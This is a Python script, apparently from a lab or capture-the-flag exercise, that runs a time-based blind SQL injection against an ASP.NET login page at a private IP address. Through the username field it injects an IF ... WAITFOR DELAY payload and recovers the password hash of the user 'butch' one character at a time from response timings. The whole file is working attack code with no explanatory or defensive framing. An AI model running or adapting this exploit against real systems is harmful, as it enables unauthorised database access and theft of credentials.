import string
import requests
import time
import urllib.parse

url = 'http://192.168.198.63:450/'

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

body = '__VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB%2B%2FpXdQqiz9h%2Bj5nHjE4OqEYro7hz%2FkDYh48fQ%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQ5uNqOYHbIeyi7LRhe1%2B7mG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC%2FUYzzbo01YDuyOekjcuLek%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox={}&ctl00%24ContentPlaceHolder1%24PasswordTextBox=&ctl00%24ContentPlaceHolder1%24LoginButton=Enter'

result = ''
index = 1
tries = 0

while True:
    for i in (string.digits + string.ascii_lowercase + string.ascii_uppercase + string.punctuation.replace('%', '')):
        payload = f"'; IF (SELECT COUNT(password_hash) FROM users WHERE username='butch' AND password_hash LIKE '{result}{i}%')=1 WAITFOR DELAY '00:00:05'--"
        encoded = urllib.parse.quote_plus(payload)
        start = time.time()
        requests.post(url, headers=headers, data=body.format(encoded)) # , proxies={'http': 'http://localhost:8080'})
        end = time.time()
        
        elapsed = int(end - start)
        if (elapsed >= 5):
            result += i
            index += 1
            print(result)
            break

    if (i == string.punctuation[-1]):
        tries += 1
        index += 1
    
    if (tries == 2):
        print('exhausted')
        break

